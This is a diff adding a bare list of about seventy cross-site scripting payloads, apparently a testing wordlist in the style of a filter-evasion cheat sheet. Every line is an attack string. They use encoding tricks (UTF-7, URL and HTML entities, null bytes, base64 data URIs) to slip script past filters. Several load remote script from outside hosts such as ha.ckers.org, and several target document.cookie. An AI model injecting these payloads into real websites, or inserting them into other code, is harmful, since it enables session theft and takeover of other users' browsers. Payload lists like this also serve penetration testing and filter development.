@@ -1,0 +1,72 @@
+<IMG STYLE="xss:expr/*XSS*/ession(alert('XSS'))">
+<XSS STYLE="xss:expression(alert('XSS'))">
+exp/*<A STYLE='no\xss:noxss("*//*");xss:&#101;x&#x2F;*XSS*//*/*/pression(alert("XSS"))'>
+<EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED>
+a="get";b="URL(ja\"";c="vascr";d="ipt:ale";e="rt('XSS');\")";eval(a+b+c+d+e);
+<SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT>
+<HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS&lt;SCRIPT DEFER&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;"></BODY></HTML>
+<SCRIPT>document.write("<SCRI");</SCRIPT>PT SRC="http://ha.ckers.org/xss.js"></SCRIPT>
+<form id="test" /><button form="test" formaction="javascript:alert(123)">TESTHTML5FORMACTION
+<form><button formaction="javascript:alert(123)">crosssitespt
+<frameset onload=alert(123)>
+<!--<img src="--><img src=x onerror=alert(123)//">
+<style><img src="</style><img src=x onerror=alert(123)//">
+<object data="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">
+<embed src="javascript:alert(1)">
+<? foo="><script>alert(1)</script>">
+<! foo="><script>alert(1)</script>">
+</ foo="><script>alert(1)</script>">
+<script>({0:#0=alert/#0#/#0#(123)})</script>
+<script>ReferenceError.prototype.__defineGetter__('name', function(){alert(123)}),x</script>
+<script>Object.__noSuchMethod__ = Function,[{}][0].constructor._('alert(1)')()</script>
+<script src="#">{alert(1)}</script>;1
+<script>crypto.generateCRMFRequest('CN=0',0,0,null,'alert(1)',384,null,'rsa-dual-use')</script>
+<svg xmlns="#"><script>alert(1)</script></svg>
+<svg onload="javascript:alert(123)" xmlns="#"></svg>
+<iframe xmlns="#" src="javascript:alert(1)"></iframe>
++ADw-script+AD4-alert(document.location)+ADw-/script+AD4-
+%2BADw-script+AD4-alert(document.location)%2BADw-/script%2BAD4-
++ACIAPgA8-script+AD4-alert(document.location)+ADw-/script+AD4APAAi-
+%2BACIAPgA8-script%2BAD4-alert%28document.location%29%2BADw-%2Fscript%2BAD4APAAi-
+%253cscript%253ealert(document.cookie)%253c/script%253e
+“><s”%2b”cript>alert(document.cookie)</script>
+“><ScRiPt>alert(document.cookie)</script>
+“><<script>alert(document.cookie);//<</script>
+foo<script>alert(document.cookie)</script>
+<scr<script>ipt>alert(document.cookie)</scr</script>ipt>
+%22/%3E%3CBODY%20onload=’document.write(%22%3Cs%22%2b%22cript%20src=http://my.box.com/xss.js%3E%3C/script%3E%22)’%3E
+‘; alert(document.cookie); var foo=’
+foo\’; alert(document.cookie);//’;
+</script><script >alert(document.cookie)</script>
+<img src=asdf onerror=alert(document.cookie)>
+<BODY ONLOAD=alert(’XSS’)>
+<script>alert(1)</script>
+"><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>
+<video src=1 onerror=alert(1)>
+<audio src=1 onerror=alert(1)>
+&lt;iframe src=http&#58;//ha&#46;ckers&#46;org/scriptlet&#46;html&gt;
+&lt;IMG SRC=\"javascript&#058;alert('XSS')\"
+&lt;SCRIPT SRC=//ha&#46;ckers&#46;org/&#46;js&gt;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js?&lt;B&gt;
+&lt;&lt;SCRIPT&gt;alert(\"XSS\");//&lt;&lt;/SCRIPT&gt;
+&lt;SCRIPT/SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;BODY onload!#$%&()*~+-_&#46;,&#58;;?@&#91;/|\&#93;^`=alert(\"XSS\")&gt;
+&lt;SCRIPT/XSS SRC=\"http&#58;//ha&#46;ckers&#46;org/xss&#46;js\"&gt;&lt;/SCRIPT&gt;
+&lt;IMG SRC=\"   javascript&#058;alert('XSS');\"&gt;
+perl -e 'print \"&lt;SCR\0IPT&gt;alert(\\"XSS\\")&lt;/SCR\0IPT&gt;\";' &gt; out
+perl -e 'print \"&lt;IMG SRC=java\0script&#058;alert(\\"XSS\\")&gt;\";' &gt; out
+&lt;IMG SRC=\"jav&#x0D;ascript&#058;alert('XSS');\"&gt;
+&lt;IMG SRC=\"jav&#x0A;ascript&#058;alert('XSS');\"&gt;
+&lt;IMG SRC=\"jav&#x09;ascript&#058;alert('XSS');\"&gt;
+&lt;IMG SRC=&#x6A&#x61&#x76&#x61&#x73&#x63&#x72&#x69&#x70&#x74&#x3A&#x61&#x6C&#x65&#x72&#x74&#x28&#x27&#x58&#x53&#x53&#x27&#x29&gt;
+&lt;IMG SRC=&#0000106&#0000097&#0000118&#0000097&#0000115&#0000099&#0000114&#0000105&#0000112&#0000116&#0000058&#0000097&#0000108&#0000101&#0000114&#0000116&#0000040&#0000039&#0000088&#0000083&#0000083&#0000039&#0000041&gt;
+&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
+&lt;IMG SRC=javascript&#058;alert(String&#46;fromCharCode(88,83,83))&gt;
+&lt;IMG \"\"\"&gt;&lt;SCRIPT&gt;alert(\"XSS\")&lt;/SCRIPT&gt;\"&gt;
+&lt;IMG SRC=`javascript&#058;alert(\"RSnake says, 'XSS'\")`&gt;
+&lt;IMG SRC=javascript&#058;alert(&quot;XSS&quot;)&gt;
+&lt;IMG SRC=JaVaScRiPt&#058;alert('XSS')&gt;
+&lt;IMG SRC=javascript&#058;alert('XSS')&gt;
+&lt;IMG SRC=\"javascript&#058;alert('XSS');\"&gt;
+&lt;SCRIPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;
